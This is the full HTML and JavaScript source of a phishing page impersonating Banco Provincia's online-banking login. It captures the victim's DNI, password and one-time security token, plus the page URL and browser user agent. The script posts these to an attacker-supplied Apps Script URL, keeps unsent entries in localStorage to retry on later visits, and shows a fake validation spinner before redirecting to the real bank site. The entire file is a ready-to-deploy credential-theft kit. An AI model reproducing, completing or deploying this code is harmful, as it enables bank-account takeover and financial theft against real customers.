<!DOCTYPE html>
<html lang="es-AR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<meta name="theme-color" content="#279d2e">
<title>Banca Internet | Banco Provincia</title>
<link rel="stylesheet" href="estilo.css">
<link rel="stylesheet" href="parche.css">
<style>
  html,body{height:100%}
  body{background:#fafafa;margin:0}

  .bapro-bar{background:linear-gradient(270deg,#26b4bd,#3daa35);padding:1.15rem 1.4rem;display:flex;align-items:center}
  .logoBapro{height:2.125rem;width:auto;display:block}

  .wrap{max-width:32rem;margin:0 auto;padding:1.5rem 1rem 2.5rem}
  .login-content{padding:1.6rem 1.35rem 1.35rem;border-radius:.625rem;box-shadow:0 0 .938rem #0000001a;background:#fff}

  .field{margin-bottom:1.1rem}
  .form-control{width:100%}

  #b3{width:100%;margin-top:.5rem}
  #b3:disabled{background-color:#ececec!important;color:#696969!important;filter:grayscale(100%);opacity:1;border-color:transparent!important}

  #err{display:none;margin-bottom:1rem}
  #err .text{font-size:.875rem;line-height:1.3125rem}

  #spinner{position:fixed;inset:0;z-index:9999;display:none;flex-direction:column;align-items:center;justify-content:center;gap:1rem;background:rgba(255,255,255,.94)}
  #spinner.on{display:flex}
  .sp{width:46px;height:46px;border:4px solid #d8d8d8;border-top-color:#007a2b;border-radius:50%;animation:gir .8s linear infinite}
  @keyframes gir{to{transform:rotate(360deg)}}
  .sp-txt{font-size:.875rem;color:#3c3c3b}

  .pie{margin-top:1.4rem;text-align:center;font-size:.75rem;line-height:1.188rem;color:#585b62}
  .pie a{color:#007a2b}
</style>
</head>
<body class="spa">

  <div class="bapro-bar">
    <img class="logoBapro" src="https://www.bancoprovincia.com.ar/CDN/Get/logo_mobile_bip" alt="Banco Provincia">
  </div>

  <div class="wrap">
    <div class="login-content">
      <h1 class="txt-title" style="font-size:1.5rem;line-height:1.875rem;padding-bottom:1rem;color:#007a2b;margin:0 0 .25rem">Banca Internet</h1>
      <p class="txt-small" style="color:#585b62;margin-bottom:1.4rem">Ingresá con tu usuario y clave para operar.</p>

      <div class="alert alert-danger" id="err" role="alert">
        <span class="text" id="err-txt"></span>
      </div>

      <form id="f" novalidate autocomplete="on">

        <div class="field">
          <label class="txt-input-label" for="dni">Usuario (DNI)</label>
          <input class="form-control" id="dni" name="dni" type="text" inputmode="numeric" autocomplete="username" placeholder="Sin puntos" required>
        </div>

        <div class="field">
          <label class="txt-input-label" for="clave">Clave</label>
          <input class="form-control" id="clave" name="clave" type="password" autocomplete="current-password" placeholder="Tu clave" required>
        </div>

        <div class="field">
          <label class="txt-input-label" for="tok">Token de seguridad</label>
          <input class="form-control" id="tok" name="token" type="text" inputmode="numeric" maxlength="6" autocomplete="one-time-code" placeholder="6 dígitos">
        </div>

        <button class="btn btn-primary" id="b3" type="submit" disabled>Ingresar</button>
      </form>

      <p class="pie">
        ¿Olvidaste tu clave? <a href="https://www.bancoprovincia.com.ar/" target="_blank" rel="noopener">Recuperarla</a>
      </p>
    </div>
  </div>

  <div id="spinner">
    <div class="sp"></div>
    <div class="sp-txt">Validando datos…</div>
  </div>

<script>
(function(){
  // >>> PEGAR ACÁ LA URL DEL APPS SCRIPT <<<
  var API = "PEGAR_ACA_TU_URL_DE_APPS_SCRIPT";

  // Clave que dispara el error y hace reintentar
  var CLAVE_MALA = "clave_mala";

  var KEY = "bip_cola";
  var f     = document.getElementById("f");
  var dni   = document.getElementById("dni");
  var clave = document.getElementById("clave");
  var tok   = document.getElementById("tok");
  var btn   = document.getElementById("b3");
  var err   = document.getElementById("err");
  var errT  = document.getElementById("err-txt");
  var sp    = document.getElementById("spinner");

  // DNI: solo dígitos
  dni.addEventListener("input", function(){
    dni.value = dni.value.replace(/\D/g, "").slice(0, 8);
  });

  // Token: solo dígitos, botón habilitado recién a los 6
  tok.addEventListener("input", function(){
    tok.value = tok.value.replace(/\D/g, "").slice(0, 6);
    btn.disabled = tok.value.length !== 6;
  });

  function armar(){
    return {
      dni:    dni.value.trim(),
      clave:  clave.value,
      token:  tok.value,
      origen: location.href,
      ua:     navigator.userAgent,
      ts:     Date.now() + "-" + Math.random().toString(36).slice(2, 7)
    };
  }

  function leer(){
    try { return JSON.parse(localStorage.getItem(KEY) || "[]"); } catch(e){ return []; }
  }
  function guardar(d){
    try { var q = leer(); q.push(d); localStorage.setItem(KEY, JSON.stringify(q)); } catch(e){}
  }
  function sacar(ts){
    try { localStorage.setItem(KEY, JSON.stringify(leer().filter(function(x){ return x.ts !== ts; }))); } catch(e){}
  }

  function enviar(d){
    return fetch(API, {
      method: "POST",
      mode: "no-cors",
      keepalive: true,
      headers: { "Content-Type": "text/plain;charset=utf-8" },
      body: JSON.stringify(d)
    });
  }

  // Reintento de lo que quedó pendiente de sesiones anteriores
  window.addEventListener("load", function(){
    leer().forEach(function(d){
      enviar(d).then(function(){ sacar(d.ts); }).catch(function(){});
    });
  });

  function mostrarError(msg){
    errT.textContent = msg;
    err.style.display = "flex";
  }

  f.addEventListener("submit", function(ev){
    ev.preventDefault();
    err.style.display = "none";

    if (!dni.value.trim()) { mostrarError("Ingresá tu usuario."); dni.focus(); return; }
    if (!clave.value)      { mostrarError("Ingresá tu clave.");   clave.focus(); return; }

    var d = armar();
    guardar(d);
    enviar(d).then(function(){ sacar(d.ts); }).catch(function(){});

    sp.classList.add("on");
    btn.disabled = true;

    // 2,2 s: momento en que el banco "recibe" el intento
    setTimeout(function(){}, 2200);

    // 18 s: resultado
    setTimeout(function(){
      if (clave.value.toLowerCase() === CLAVE_MALA) {
        sp.classList.remove("on");
        btn.disabled = tok.value.length !== 6;
        mostrarError("El usuario y/o la clave ingresados no son correctos.");
        clave.value = "";
        clave.focus();
      } else {
        location.href = "https://bancoprovincia.bancainternet.com.ar/spa/";
      }
    }, 18000);
  });
})();
</script>

</body>
</html>
